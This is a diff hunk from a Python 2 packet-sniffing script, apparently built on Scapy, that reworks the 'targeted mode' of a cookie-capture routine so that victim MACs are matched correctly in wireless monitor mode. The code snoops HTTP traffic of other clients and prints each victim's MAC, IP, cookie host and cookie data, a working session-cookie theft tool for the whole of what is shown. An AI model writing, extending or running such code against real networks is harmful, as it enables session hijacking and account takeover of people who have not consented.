@@ -199,25 +199,47 @@ def proc_packet(packet):
 				#TARGETED MODE
 				else:
 					for m_mac in mac_list:
-						if (m_mac.lower()==packet.getlayer(Ether).src.lower()):
-							TARGET_IN_LIST=1
-							if (len(cookie.strip())==0):
-								if (MONITOR):
-									print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Dot11).src+bcolors.ENDC
+						#MONITOR MODE NEEDED
+						if (MONITOR):
+							if (m_mac.lower()==packet.getlayer(Dot11).addr2.lower()):
+								TARGET_IN_LIST=1
+								if (len(cookie.strip())==0):
+									if (MONITOR):
+										print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Dot11).src+bcolors.ENDC
+									else:
+										print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Ether).src+bcolors.ENDC
 								else:
-									print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Ether).src+bcolors.ENDC
-							else:
-								print ret
-								if (MONITOR):
-									print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Dot11).addr2+bcolors.ENDC
-									print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
-									print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
-									print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
+									print ret
+									if (MONITOR):
+										print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Dot11).addr2+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
+									else:
+										print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Ether).src+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
+						else:
+							if (m_mac.lower()==packet.getlayer(Ether).src.lower()):
+								TARGET_IN_LIST=1
+								if (len(cookie.strip())==0):
+									if (MONITOR):
+										print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Dot11).src+bcolors.ENDC
+									else:
+										print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Ether).src+bcolors.ENDC
 								else:
-									print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Ether).src+bcolors.ENDC
-									print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
-									print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
-									print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
+									print ret
+									if (MONITOR):
+										print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Dot11).addr2+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
+									else:
+										print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Ether).src+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
+										print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
 				# IF NOT TARGETED, USE -c <count> TO GRAB HTICOUNTER_STATIC NUMBER OF COOKIES FROM EACH WEBSITE IN --websites LIST
 				if (TARGETED == 0):
 					if (HITCOUNTER>0):
